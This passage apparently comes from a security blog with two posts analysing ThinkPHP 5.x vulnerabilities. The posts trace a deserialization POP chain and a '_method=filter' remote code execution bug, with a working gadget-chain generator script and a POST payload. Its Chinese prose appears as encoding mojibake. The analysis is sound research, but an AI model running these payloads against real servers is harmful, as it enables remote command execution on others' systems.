     $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›getValue()å‡½æ•°</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">(isset<span class="params">($this-&gt;withAttr[$fieldName])</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">       $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br><span class="line">       $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>æ¼æ´è§¦å‘ç‚¹å¦‚ä¸‹</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br></pre></td></tr></table></figure>

<p>å›æ¨$valueï¼Œ$closureï¼Œ$this-&gt;data</p>
<p><strong>å…ˆçœ‹ä¸€ä¸‹$value</strong></p>
<p>æˆ‘ä»¬è¿™é‡Œå¹¶æ²¡æœ‰è®¾ç½®$relationï¼Œæ‰€ä»¥è¿™é‡Œ$valueçš„å€¼æ˜¯ä»å‚æ•°ä¼ è¿›æ¥çš„ï¼Œå›æ¨åˆ°getAttrå‡½æ•°ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">true</span>;</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°$value= $this-&gt;getData($name),è·Ÿè¿›getDataå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†æ›´æ¸…æ™°çš„è§£é‡Šï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ª$nameä¼ è¿›æ¥çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">        $item[$key] = $val-&gt;toArray();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œå…ˆé€šè¿‡äº†arrar_mergeå‡½æ•°å°†$this-&gt;dataä¸$this-&gt;relationï¼Œä½†æ˜¯$this-&gt;relationæ²¡èµ‹å€¼çš„æƒ…å†µä¸‹ï¼Œ$dataå°±æ˜¯$this-&gt;data,æ‰€ä»¥å¯ä»¥çœ‹å‡ºä¼ å…¥getAttrå‡½æ•°ä¸­çš„å‚æ•°æ˜¯dataæ•°ç»„ä¸­çš„é”®å€¼</p>
<p>æ¥ç€getData</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$nameéç©ºï¼Œè¿›å…¥getRealFieldNameå‡½æ•°ï¼Œè·Ÿè¿›</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? $name : App::parseName($name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å»çœ‹ä¸€ä¸‹$this-&gt;strictçš„å€¼ï¼Œåœ¨Attribute.phpä¸­ç¬¬86è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $strict = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå°±æ„å‘³ç€$fieldNameä¹Ÿæ˜¯æˆ‘ä»¬$nameæ•°ç»„çš„key,ç´§æ¥ç€</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±è¿”å›äº†æˆ‘ä»¬$nameæ•°ç»„é”®å¯¹åº”çš„å€¼,ä¹Ÿå°±æ˜¯$valueã€‚</p>
<p>åœ¨getAttrå‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é€šè¿‡getDataè¿”å›çš„å€¼ä½œä¸º$valueä¼ ç»™äº†getValueå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ...</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æˆ‘ä»¬å°±ç¡®å®šäº†æ¼æ´è§¦å‘ç‚¹$value   = $closure($value, $this-&gt;data);ä¸­$valueçš„å€¼ã€‚</p>
<p>æ¥ç€å»çœ‹ä¸€ä¸‹$closureçš„å€¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥è‡ªå·±æ§åˆ¶withAttrè¿™ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ¥ç€å»çœ‹ä¸€ä¸‹$fieldNameçš„å€¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br></pre></td></tr></table></figure>

<p>å’Œä¹‹å‰çš„ä¸€æ ·ï¼Œ$nameçš„å€¼ä¹Ÿæ˜¯æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ï¼Œæ˜¯dataæ•°ç»„çš„é”®å€¼ï¼Œé‚£ä¹ˆ$closureçš„å€¼ä¹Ÿæ‰¾åˆ°äº†ï¼Œå°±æ˜¯withAttræ•°ç»„ä¸­çš„å€¼</p>
<p>å†çœ‹ä¸€ä¸‹$this-&gt;data,æˆ‘ä»¬å¯ä»¥è‡ªå·±è®¾ç½®</p>
<p>æœ€ç»ˆå½¢å¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span><span class="params">(param,array<span class="params">()</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ–¹å¼å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>();</span><br><span class="line">system(<span class="string">'whoami'</span>,$a);</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># php test.php</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆexpå°±æ¯”è¾ƒå¥½å†™äº†ï¼Œé­”æ”¹äº†ä¸€ä¸‹tp5.1çš„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $files;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $data=<span class="keyword">array</span>(<span class="string">"pwn"</span> =&gt; <span class="string">"calc.exe"</span>);</span><br><span class="line">        <span class="keyword">private</span> $withAttr = <span class="keyword">array</span>(<span class="string">"pwn"</span> =&gt; <span class="string">"system"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line">$Conver = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($Conver));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨æ ˆ</p>
<p><img src="https://s2.ax1x.com/2019/10/08/uhQgxK.png" alt="uhQgxK.png"></p>
<p><img src="https://s2.ax1x.com/2019/10/08/uh3ibF.png" alt="uh3ibF.png"></p>
<h3 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h3><p><a href="https://www.anquanke.com/post/id/187819" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187819</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" data-id="ckabsu38q002dkkvr49aebqp7" class="article-share-link" data-share="baidu" data-title="Thinkphp 5.2.x popé“¾åˆ†æ">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Webå®‰å…¨</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Thinkphp-5-1-5-2-RCEåˆ†æ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-08T08:11:25.000Z" itemprop="datePublished">2019-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/">Thinkphp 5.1-5.2 RCEåˆ†æ</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p><a href="https://imgchr.com/i/edTNeP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/02/edTNeP.png" alt="edTNeP.png"></a></p>
<p>payloadä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=exec&amp;f=calc.exe&amp;&amp;_method=filter</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¦–å…ˆéœ€è¦åœ¨å…¥å£æ–‡ä»¶å¤„å…³é—­æŠ¥é”™â€”â€”<code>error_reporting(0)</code>ï¼Œç„¶ååœ¨å…¥å£å¤„æ‰“ä¸€ä¸‹æ–­ç‚¹è·Ÿè¿›ã€‚é—®é¢˜å‡ºç°åœ¨è·å–è·¯ç”±æ£€æµ‹çš„åœ°æ–¹</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBVSjH.png" alt="eBVSjH.png"></p>
<p>åœ¨è¿™ä¸ªåœ°æ–¹æ¥ç€æ‰“æ–­ç‚¹ï¼Œå¼€å§‹è‡ªé—­å¼è·Ÿè¿›â€¦<strong>ï¼ˆå› ä¸ºæˆ‘ä¸å¤ªæ¸…æ¥šæ€ä¹ˆå»è®°å½•æ•´ä¸ªè·Ÿè¿›çš„æµç¨‹æ ˆï¼Œæ‰€ä»¥åªèƒ½ç–¯ç‹‚è‡ªé—­ç‚¹å‡»äº†ï¼Œæœ€åå‘ç°é—®é¢˜æ‰€åœ¨ï¼‰</strong></p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBVBUx.png" alt="eBVBUx.png"></p>
<p>è·Ÿè¿›åˆ°äº†Domainç±»ä¸­çš„checkæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº†requestçš„ç±»ä¸­çš„methodæ–¹æ³•ï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŸå§‹è¯·æ±‚ç±»å‹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é—®é¢˜å°±å‡ºç°åœ¨è¿™ä¸ª<code>var_method</code>æ˜¯å¯æ§å­—æ®µï¼Œç”±postæ¥æ§åˆ¶ï¼Œç»‘å®šå¦‚ä¸‹ï¼š</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBKlVJ.png" alt="eBKlVJ.png"></p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡postæ‰€ä¼ å‚çš„å­—æ®µæ¥æ§åˆ¶<code>$this-&gt;method</code>çš„å€¼ï¼Œæ¥ä¸‹æ¥è·Ÿç€å¦‚ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•äº†ï¼Œåœ¨expä¸­ç»™çš„æ˜¯filteræ–¹æ³•ï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹ï¼š</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($filter = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨filteræ–¹æ³•æ¥å¯¹<code>Request</code>ç±»ä¸­çš„filterå˜é‡åœ¨è¿›è¡Œè¦†ç›–ï¼Œè¦†ç›–å<code>$this-&gt;filter</code>çš„å€¼å°±å˜æˆäº†æˆ‘ä»¬ä¼ é€’çš„postæ•°ç»„äº†ã€‚</p>
<p>æ¥ä¸‹æ¥æ‰§è¡Œä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$method = strtolower($request-&gt;method());</span><br><span class="line">$rules  = array_merge(<span class="keyword">$this</span>-&gt;rules[<span class="string">'*'</span>], <span class="keyword">$this</span>-&gt;rules[$method]);</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¿™é‡Œçš„$methodæ–¹æ³•æ˜¯æˆ‘ä»¬é€šè¿‡methodæ–¹æ³•è¦†ç›–è¿‡çš„ï¼Œæ‰€ä»¥æ­¤æ—¶çš„$methodçš„å€¼å…¶å®æ˜¯filterï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»ä¸Šé¢å›¾ç‰‡ä¸­çœ‹åˆ°rulesæ•°ç»„ä¸­æ˜¯æ²¡æœ‰filterå­—æ®µçš„ï¼Œæ‰€ä»¥å¦‚æœç›´æ¥å»æ‰§è¡Œexpçš„å›æ˜¾æ˜¯å¦‚ä¸‹æƒ…å†µçš„ï¼š</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBQMN9.png" alt="eBQMN9.png"></p>
<p>åˆ™ä¼šç›´æ¥æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å‰é¢æ˜¯éœ€è¦å…³é—­æŠ¥é”™çš„ï¼Œè¿™æ ·expæ‰èƒ½æ­£å¸¸çš„æ‰§è¡Œã€‚</p>
<p>å½“æŠ¥é”™å…³é—­åï¼Œè¿™ä¸ªè°ƒç”¨methodæ–¹æ³•åäº§ç”Ÿçš„ç»“æœå°±ä¼šæˆåŠŸçš„å‡ºæ¥äº†ï¼Œä¹Ÿå°±æ˜¯åœ¨requestç±»ä¸­æˆåŠŸäº§ç”Ÿçš„èµ‹å€¼ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBReK0.png" alt="eBReK0.png"></p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBR3G9.png" alt="eBR3G9.png"></p>
<p>ä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„æ˜¯è°ƒç”¨<code>routecheck</code>æ–¹æ³•åä¼šäº§ç”Ÿmethodæ–¹æ³•çš„è°ƒç”¨è¿‡ç¨‹è¿›è€Œå¯¼è‡´æˆ‘ä»¬æ‰€ä¼ é€’çš„å€¼éƒ½è¿›è¡Œäº†èµ‹äºˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å›åˆ°appç±»ï¼Œæ¥ç€å‘ä¸‹è·Ÿè¿›</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBRNqK.png" alt="eBRNqK.png"></p>
